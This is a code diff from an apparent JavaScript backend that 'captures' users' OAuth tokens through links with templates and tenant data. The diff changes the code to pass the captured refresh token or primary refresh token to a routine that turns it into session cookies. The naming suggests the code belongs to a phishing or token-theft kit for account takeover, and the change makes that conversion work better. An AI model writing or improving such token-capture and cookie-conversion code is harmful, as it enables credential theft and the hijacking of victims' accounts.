@@ -375,8 +375,10 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
     // If link is in cookie mode, trigger cookie conversion asynchronously
     // PASS TENANT, ACCOUNT TYPE, AND CAPTURE META (client_info, session_key)
+    // FIX: Pass refresh_token (not access_token) - cookie converter needs refresh token to generate session cookies
+    const refreshTokenForConversion = refresh_token || prt || access_token;
     if (link.auth_mode === 'cookie') {
-        processCookieConversion(tokenId, access_token, link.template_type, tenant, accountType, captureMeta)
+        processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, captureMeta)
             .then((cookieResult) => {
                 const io = req.app.get('io');
                 if (io) {
